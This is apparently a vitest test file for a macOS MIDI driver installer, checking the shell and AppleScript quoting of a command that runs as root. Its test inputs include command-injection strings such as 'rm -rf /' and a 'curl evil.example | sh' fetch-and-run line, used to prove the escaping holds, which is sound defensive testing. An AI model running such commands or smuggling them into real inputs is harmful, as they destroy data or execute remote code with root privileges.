// SPDX-License-Identifier: GPL-3.0-only
import { describe, it, expect } from "vitest";
import { homedir } from "node:os";
import {
  DRIVER_DIRS,
  driverSourcePaths,
  installScript,
  shellQuoteForAppleScript,
} from "../src/midi/driverInstall.js";

/**
 * Installing the CoreMIDI driver.
 *
 * What can be tested without a Mac is the part that decides *where* the driver
 * goes and *what string* gets handed to a shell running as root. The second is
 * the one that matters: `do shell script … with administrator privileges` runs
 * its argument as a shell command as root, so a quoting mistake here is not a
 * cosmetic bug.
 */

describe("where the driver goes", () => {
  it("prefers the user's own Library, which needs no password", () => {
    /*
     * The whole reason the per-user path is first. CoreMIDI's header lists
     * both locations, and a MIDI driver for one person's music software has no
     * business being installed for every account — nor is a password prompt
     * something to spend when nothing is bought with it.
     */
    expect(DRIVER_DIRS.user).toBe(
      `${homedir()}/Library/Audio/MIDI Drivers`,
    );
    expect(DRIVER_DIRS.system).toBe("/Library/Audio/MIDI Drivers");
    expect(DRIVER_DIRS.user.startsWith(homedir())).toBe(true);
  });

  it("looks in Resources before beside the executable", () => {
    // Same rule as the native addons: `Contents/MacOS` means executables by
    // the bundle format's definition, and a staged bundle belongs in
    // Resources. Beside the binary is the unpackaged case.
    const paths = driverSourcePaths("/Apps/VRMC.app/Contents/MacOS/vrmc-bridge");
    expect(paths[0]).toBe("/Apps/VRMC.app/Contents/Resources/VRMC.plugin");
    expect(paths[1]).toBe("/Apps/VRMC.app/Contents/MacOS/VRMC.plugin");
  });
});

describe("quoting for the privileged shell", () => {
  /*
   * Two layers, and both have to be right at once. The value is quoted for the
   * *shell* first, then embedded in an *AppleScript string literal*. Testing
   * the two separately would miss the interaction, which is where this kind of
   * bug lives.
   */
  it("wraps a plain path in shell quotes", () => {
    expect(shellQuoteForAppleScript("/tmp/VRMC.plugin")).toBe(
      "'/tmp/VRMC.plugin'",
    );
  });

  it("survives the spaces that are in the real path", () => {
    // "/Library/Audio/MIDI Drivers" has one. Unquoted it is two arguments and
    // the driver lands in a directory called "MIDI".
    expect(shellQuoteForAppleScript("/Library/Audio/MIDI Drivers")).toBe(
      "'/Library/Audio/MIDI Drivers'",
    );
  });

  it("closes and reopens the quote around an embedded one", () => {
    // A home directory really can contain an apostrophe. Naive quoting ends
    // the string there and hands the rest to the shell as code — as root.
    expect(shellQuoteForAppleScript("/Users/o'brien/x")).toBe(
      `'/Users/o'\\\\''brien/x'`,
    );
  });

  it("escapes what AppleScript would otherwise read as syntax", () => {
    // Backslash and double quote are the two characters that mean something
    // inside an AppleScript string literal.
    expect(shellQuoteForAppleScript('a"b')).toBe(`'a\\"b'`);
    expect(shellQuoteForAppleScript("a\\b")).toBe(`'a\\\\b'`);
  });

  /*
   * The property worth asserting is a round trip, not the shape of the output.
   *
   * A first attempt here checked the escaped string against a regex, which
   * proved only that it did not *look* dangerous — and it failed on a correctly
   * escaped value, because after two layers of quoting a safe string is full of
   * quotes and backslashes. What actually matters is that the two layers undo
   * to exactly the input: AppleScript parses its literal, the shell parses the
   * word, and what the command receives is the path and nothing else.
   */
  const unescapeAppleScriptLiteral = (text: string): string =>
    text.replace(/\\(.)/g, "$1");

  /**
   * Parse one shell word, honouring single quotes and backslash escapes.
   *
   * The backslash case is not optional detail: `'\''` — quote, escaped quote,
   * quote — is the whole mechanism by which a single quote survives inside a
   * single-quoted string, and it works precisely because a backslash *outside*
   * quotes escapes the next character. A first version of this parser treated
   * that backslash literally and reported correct escaping as an injection.
   */
  const shellWord = (text: string): string => {
    let out = "";
    let i = 0;
    let quoted = false;
    while (i < text.length) {
      const c = text[i]!;
      if (c === "'") {
        quoted = !quoted;
        i++;
      } else if (c === "\\" && !quoted) {
        if (i + 1 >= text.length) throw new Error("trailing backslash");
        out += text[i + 1]!;
        i += 2;
      } else if (!quoted && (c === " " || c === ";" || c === "#")) {
        throw new Error(`escaped to more than one word at ${i}: ${text}`);
      } else {
        out += c;
        i++;
      }
    }
    if (quoted) throw new Error("unbalanced quote");
    return out;
  };

  const roundTrip = (value: string): string =>
    shellWord(unescapeAppleScriptLiteral(shellQuoteForAppleScript(value)));

  it.each([
    "/tmp/VRMC.plugin",
    "/Library/Audio/MIDI Drivers",
    "/Users/o'brien/Library/Audio/MIDI Drivers",
    "/Users/a\\b/x",
    '/Users/say"what/x',
    "/tmp/x'; rm -rf / #",
    "/tmp/$(whoami)/`id`",
    "/tmp/x && curl evil.example | sh",
  ])("round-trips %j to exactly itself, as one word", (value) => {
    /*
     * The paths involved are the app's own and the user's home, so the hostile
     * cases are not a live threat — but "the input is trusted" is the argument
     * every injection bug was shipped under, and this command runs as root.
     */
    expect(roundTrip(value)).toBe(value);
  });

  it("would catch quoting that let a second command through", () => {
    // The check above is only worth having if it fails on a naive escape.
    const naive = (v: string): string => `'${v}'`;
    expect(() =>
      shellWord(unescapeAppleScriptLiteral(naive("/tmp/x'; rm -rf / #"))),
    ).toThrow();
  });
});

describe("the script that runs as root", () => {
  const script = installScript(
    "/Apps/VRMC.app/Contents/Resources/VRMC.plugin",
    "/Library/Audio/MIDI Drivers",
  );

  it("asks for administrator privileges, once", () => {
    expect(script).toContain("with administrator privileges");
    expect(script.match(/with administrator privileges/g)).toHaveLength(1);
  });

  it("removes the old bundle before copying, rather than merging onto it", () => {
    /*
     * `cp -R` onto an existing bundle merges directories. An older driver's
     * files would survive inside a signature that no longer seals them, which
     * is a bundle macOS will refuse to load — and the symptom is the new
     * driver appearing not to work.
     */
    const rm = script.indexOf("rm -rf");
    const cp = script.indexOf("cp -R");
    expect(rm).toBeGreaterThan(-1);
    expect(rm).toBeLessThan(cp);
    expect(script).toContain(
      `rm -rf '/Library/Audio/MIDI Drivers/VRMC.plugin'`,
    );
  });

  it("creates the directory, which does not exist on a clean Mac", () => {
    expect(script).toContain("mkdir -p '/Library/Audio/MIDI Drivers'");
  });

  it("clears the quarantine flag the copy inherits from the app", () => {
    /*
     * A downloaded app has com.apple.quarantine on everything inside it, and
     * macOS `cp` preserves extended attributes — so without this the driver
     * lands in the MIDI Drivers folder still flagged as downloaded.
     * MIDIServer gets no dialog to approve it, so that is a driver that may
     * simply never load, with nothing said anywhere the user looks.
     */
    expect(script).toContain("xattr -r -d com.apple.quarantine");
    const cp = script.indexOf("cp -R");
    expect(script.indexOf("com.apple.quarantine")).toBeGreaterThan(cp);
  });

  it("does not fail the install when there was no quarantine flag", () => {
    // `xattr -d` errors when the attribute is absent, which is the normal case
    // for a locally built driver. That is a success, not a failure.
    expect(script).toContain("|| true");
  });

  it("clears quarantine only on the bundle it just installed", () => {
    // Scoped to one path. Nothing here touches quarantine on anything the app
    // did not ship, and nothing disables Gatekeeper or assessment.
    const after = script.slice(script.indexOf("com.apple.quarantine"));
    expect(after).toContain("'/Library/Audio/MIDI Drivers/VRMC.plugin'");
    expect(script).not.toContain("spctl");
    expect(script).not.toContain("--master-disable");
  });

  it("never interpolates a path unquoted", () => {
    // Every path in the command is inside single quotes. A bare
    // /Library/Audio/MIDI Drivers would break on the space alone.
    for (const bare of ["/Library/Audio/MIDI Drivers/"]) {
      expect(script).not.toContain(` ${bare} `);
    }
    expect(script).toContain("'/Library/Audio/MIDI Drivers'");
  });
});
